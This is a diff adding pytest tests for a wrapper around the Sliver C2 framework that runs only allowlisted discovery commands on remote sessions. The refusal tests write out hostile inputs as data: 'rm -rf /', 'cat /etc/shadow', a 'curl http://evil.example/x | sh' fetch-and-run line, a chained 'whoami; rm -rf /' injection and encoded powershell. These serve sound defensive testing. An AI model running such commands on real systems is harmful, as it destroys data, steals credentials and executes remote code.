@@ -335,3 +335,92 @@ def test_parse_table_handles_compact_layout():
 
 def test_parse_table_empty_input():
     assert sliver._parse_table("", (sliver._JOB_HEADERS,)) == []
+
+
+# --- Discovery commands (MITRE T1082) --------------------------------------
+
+
+def test_run_discovery_builds_use_and_command(fake_client, stub_run):
+    capture = stub_run("root")
+    result = sliver.sliver_run_discovery("ab12cd34", "whoami")
+    assert capture["commands"] == ["use ab12cd34", "whoami"]
+    assert "session ab12cd34: whoami" in result
+    assert "root" in result
+
+
+def test_run_discovery_accepts_literal_command(fake_client, stub_run):
+    capture = stub_run("Linux host 6.1.0 #1 SMP x86_64 GNU/Linux")
+    result = sliver.sliver_run_discovery("sess1", "uname -a")
+    assert capture["commands"] == ["use sess1", "uname -a"]
+    assert "uname -a" in result
+
+
+@pytest.mark.parametrize(
+    "key,expected",
+    [
+        ("whoami", "whoami"),
+        ("id", "id"),
+        ("uname", "uname -a"),
+        ("hostname", "hostname"),
+        ("uptime", "uptime"),
+    ],
+)
+def test_run_discovery_maps_short_keys(fake_client, stub_run, key, expected):
+    capture = stub_run("ok")
+    sliver.sliver_run_discovery("s1", key)
+    assert capture["commands"] == ["use s1", expected]
+
+
+@pytest.mark.parametrize(
+    "bad",
+    [
+        "rm -rf /",
+        "cat /etc/shadow",
+        "curl http://evil.example/x | sh",
+        "whoami; rm -rf /",
+        "uname -a && id",
+        "powershell -enc ZQ==",
+        "",
+    ],
+)
+def test_run_discovery_refuses_non_allowlisted(fake_client, stub_run, bad):
+    capture = stub_run("should not run")
+    result = sliver.sliver_run_discovery("s1", bad)
+    assert "Refused" in result
+    assert capture == {}  # the runner was never invoked
+
+
+@pytest.mark.parametrize("bad_session", ["", "a b", "x;y", "../etc", "a" * 65, "sess$1"])
+def test_run_discovery_rejects_bad_session_id(fake_client, stub_run, bad_session):
+    capture = stub_run("nope")
+    result = sliver.sliver_run_discovery(bad_session, "whoami")
+    assert "Invalid session id" in result
+    assert capture == {}
+
+
+def test_run_discovery_missing_client(monkeypatch):
+    monkeypatch.setattr(sliver, "_client_path", lambda: None)
+    assert "was not found" in sliver.sliver_run_discovery("s1", "whoami")
+
+
+def test_run_discovery_daemon_down(fake_client, stub_run):
+    stub_run(CONNECTION_REFUSED)
+    assert "not reachable" in sliver.sliver_run_discovery("s1", "whoami")
+
+
+def test_run_discovery_runner_exception(fake_client, monkeypatch):
+    def _boom(commands, timeout=sliver._DISCOVERY_TIMEOUT):
+        raise RuntimeError("kaboom")
+
+    monkeypatch.setattr(sliver, "_run_sliver_commands", _boom)
+    assert "Failed to run discovery" in sliver.sliver_run_discovery("s1", "id")
+
+
+def test_discovery_commands_allowlist_is_exact():
+    assert sliver.DISCOVERY_COMMANDS == {
+        "whoami": "whoami",
+        "id": "id",
+        "uname": "uname -a",
+        "hostname": "hostname",
+        "uptime": "uptime",
+    }
